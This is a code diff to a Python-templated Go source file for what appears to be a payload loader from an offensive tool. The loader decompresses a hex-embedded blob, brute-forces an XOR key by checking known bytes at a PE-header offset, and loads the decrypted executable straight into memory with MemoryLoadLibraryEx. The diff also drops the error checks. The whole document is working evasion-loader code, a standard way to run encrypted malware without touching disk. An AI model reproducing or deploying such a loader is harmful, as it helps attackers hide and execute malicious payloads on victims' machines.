@@ -1,15 +1,16 @@
-peloader="""
+loader="""
 package main
 
 import "C"
 import (
-    "os"
-    "unsafe"
     "bytes"
     "encoding/binary"
     "encoding/hex"
     "compress/zlib"
     "io"
+
+    "unsafe"
+    "os"
 )
 
 func bf_xor(block []byte, known_bytes []byte) []byte {{
@@ -22,7 +23,7 @@ func bf_xor(block []byte, known_bytes []byte) []byte {{
         for i, ch := range encrypted {{
             decrypted[i] = (ch ^ (key[i % len(key)]))
         }}
-        if bytes.Compare(decrypted[0:len(known_bytes)], known_bytes) == 0 {{
+        if bytes.Compare(decrypted[128:132], known_bytes) == 0 {{
             if len(decrypted) == len(block) {{
                 break
             }} else {{
@@ -37,11 +38,8 @@ func bf_xor(block []byte, known_bytes []byte) []byte {{
 }}
 
 func main() {{
-    compressed, err := hex.DecodeString("{0}")
-    known_bytes, err := hex.DecodeString("{1}")
-    if err != nil {{
-        os.Exit(1)
-    }}
+    compressed, _ := hex.DecodeString("{0}")
+    known_bytes, _ := hex.DecodeString("{1}")
 
     var b1, b2 bytes.Buffer
     b1.Write([]byte(compressed))
@@ -49,14 +47,12 @@ func main() {{
     io.Copy(&b2, r)
     r.Close()
     encrypted := b2.Bytes()
-
     payload := bf_xor(encrypted, known_bytes)
 
     var cArgs []*C.char
     for _, goString := range os.Args {{
         cArgs = append(cArgs, C.CString(goString))
     }}
-
     handle := C.MemoryLoadLibraryEx(unsafe.Pointer(&payload[0]),
                                     (C.size_t)(len(payload)),
                                     (*[0]byte)(C.MemoryDefaultAlloc),
